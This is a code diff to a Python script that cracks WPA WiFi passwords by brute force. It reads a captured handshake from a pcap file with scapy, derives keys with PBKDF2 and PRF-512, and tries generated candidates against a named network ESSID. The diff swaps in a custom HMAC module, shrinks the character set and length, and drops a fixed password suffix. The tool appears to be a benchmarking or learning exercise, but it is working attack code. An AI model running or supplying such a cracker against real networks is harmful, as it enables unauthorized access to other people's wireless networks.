@@ -1,14 +1,4 @@
 # -*- coding: utf-8 -*-
-'''
-Алфавит : 'abcdef'
-Длина пароля: 5
-Результаты:
-    мой ноутбук -> 71s, 71s
-    --------------------
-    Kaggle CPU  -> 20s, 20s
-
-'''
-
 from scapy.all import rdpcap, EAPOL, Dot11, Raw
 from binascii import hexlify, a2b_hex
 from hashlib import pbkdf2_hmac, sha1
@@ -16,6 +6,7 @@ from hmac import new
 from itertools import product
 from time import time
 import os
+from custom_hashlib import main_hmac
 
 
 def check(pkt, handshakes, bssid, cl):
@@ -80,16 +71,18 @@ def customPRF512(key, A, B):
     i = 0
     R = b''
     while i <= ((blen*8+159)//160):
-        hmacsha1 = new(key, (A + b'\x00' + B + bytes([i])), sha1)
+        # hmacsha1 = new(key, (A + b'\x00' + B + bytes([i])), sha1)
+        # hmacsha1 = hmacsha1.digest()
+        hmacsha1 = main_hmac(key=key, data=(A + b'\x00' + B + bytes([i])))
         i += 1
-        R += hmacsha1.digest()
+        R += hmacsha1
     return R[:blen]
 
 
 def main():
     print('Number of CPUs: ', os.cpu_count())
 
-    packets = rdpcap('shake.pcap')
+    packets = rdpcap('packets.pcap')
     handshakes = [0, 0, 0, 0]
     essid = 'RT-WiFi-15C2'
     bssid = ''
@@ -98,10 +91,10 @@ def main():
     LATIN_LOWER = 'abcdefghijklmnopqrstuvwxyz'
     LATIN_UPPER = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
     NUMBERS = '0123456789'
-    CUSTOM = 'abcdef'
+    CUSTOM = 'aefiwh'
 
     characters = CUSTOM
-    rep = 5
+    rep = 4
     length = len(characters)**rep
     print(f"{length} passwords will be generated")
 
@@ -117,7 +110,7 @@ def main():
 
     start = time()
     for i, passwrd in enumerate(passwords):
-        password = ''.join(passwrd) + 'xY3aOIq'
+        password = ''.join(passwrd)
         if i % 200 == 0:
             print(password)
             print("-----")
